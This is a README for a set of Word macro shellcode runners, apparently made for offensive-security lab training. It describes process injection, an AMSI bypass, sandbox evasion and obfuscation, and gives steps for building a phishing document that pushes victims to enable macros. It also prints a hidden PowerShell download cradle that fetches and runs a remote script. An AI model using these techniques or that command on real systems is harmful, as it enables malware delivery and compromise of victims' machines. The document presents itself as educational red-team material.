# Macro Shellcode Runners

## ToC

| Application | Notes |
| ----------- | ----- |
| `WordMacroInject.vbs` | Injects shellcode into `explorer.exe` (64-bit Word) or a random 32-bit process, and runs it | 
| `WordMacroRunner.vbs` | Loads shellcode into `WINWORD.exe` and runs it |
| `WordMacroRunnerBasic.vbs` | Basic shellcode runner. `WordMacroRunner.vbs` without AMSI bypass or IP check |
| `WordPsCradle.vbs` | Macro with Caesar Cipher encoding that calls a PS download cradle |
| `vbObfuscate.ps1` | PS script to generate Caesar Cipher code for `WordPsCradle.vbs` |

Both `WordMacroInject.vbs` and `WordMacroRunner.vbs` have:
- Ability to run when executed from both 64-bit & 32-bit Word
- AMSI Check & Bypass
- Simple time-based AV Sandbox detection

### Setup/formatting information:
1. Write "legitimate" contents of the word doc, select all, then navigate to Insert > Quick Parts > AutoTexts and Save Selection to AutoText Gallery
2. Give it a name, make sure it's saved to that particular document and not a template. Hit ok. Then delete the content from the body of the word doc.
3. Copy in/write your pretexting content to the body of the word doc.  This is the piece that include "enable macros, hit this key combo to execute" etc.
4. Go to Macro's and click record new macro.  Ensure on both screens you select the current document and not a template.  Click keyboard and then hit a key combination to map (e.g. Alt + D).  Once you hit ok/close, recording will begin.  Then go click macros again, view, select the main runner sub, and then click run.  This will map that sequence to Alt + D so that when it is entered the runner sub will be executed.

## `WordMacroInject.vbs`
This macro performs process injection from both 32-bit and 64-bit Word processes. In 64-bit processes, it injects into `explorer.exe`, but this is easily configurable with a single variable.

In 32-bit processes, it enumerates running processes and attempts to find another 32-bit process to inject into. These are pretty sparse, but often times processes like `GoogleUpdate.exe`, `OneDrive.exe` are running as 32-bit (at least in the OSEP labs). If it can't find another 32-bit process, it injects into itself (`WINWORD.exe`).

Uses a `sleep` call to determine if being simulated by AV. The shellcode is not obfuscated at all, that is left up to the reader. Much more can be done to obfuscate the entire script but if I did that here it would be hard to even understand the script, which would defeat its educational purpose.

### Notes

If Word (and thus our Macro) is ran in 32-bit mode, we have to find another 32-bit process to inject into because 32 bit processes cannot easily inject into 64 bit ones. The presumed typical target environment will be running 32 bit word on a 64 bit OS, which renders the injection into explorer impossible.

Starting in Word 2019 the program is 64 bit by default. This means Word 2019,O365,2021 are all good candidates for Injection because Orgs/individuals would have to go out of their way to have downloaded the 32 bit one.

There are some more advanced techniques out there that might be able to facilitate 32&rarr;64 bit injection (*Heaven's gate*) but no idea if they could be implemented in VBA.

As always, there are issues concerning stability, and longevity of the process to maintain a reverse shell when we inject into random processes. In reality just using a non-injecting runner and then setting up a C2 to automigrate is probably best practice as they are equipped to do so.

## `WordMacroRunner.vbs`
This is a baseline runner that loads the shellcode into `WINWORD.exe` and executes it. Has capabilities to detect AMSI and patch it if found (for both 32-bit and 64 bit) as well as contains shellcode for both 32-bit and 64 bit Word so it can execute after detecting architecture. 

Uses a `sleep` call to determine if being simulated by AV. Also has functionality to make sure the target is in the `192.168.0.0/16` IP range, except you have to uncomment it.

The shellcode is not obfuscated at all, that is left up to the reader. Much more can be done to obfuscate the entire script but if I did that here it would be hard to even understand the script, which would defeat its educational purpose.

## `WordMacroRunnerBasic.vbs`
This is just a basic version of `WordMacroRunner.vbs` without AMSI Bypass or IP Check.

## `WordPsCradle.vbs`
Macro with Caesar Cipher encoding that calls a PowerShell download cradle.  Use with `vbObfuscate.ps1` to generate and replace obfuscated text in `WordPsCradle.vbs`. This uses WMI dechaining, so **still use x64 shellcode even if you are targeting x86 word**!

## `vbObfuscate.ps1`
Powershell script to generate Caesar Cipher code for `WordPsCradle.vbs`.  Make sure offsets match for encrypt/decrypt. First output is download cradle, last is app name for app name check before running. 

**This is where you would edit the PS Cradle you would like to run**. The default is:
```ps1
powershell -exec bypass -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://192.168.49.66/attach.txt')
```
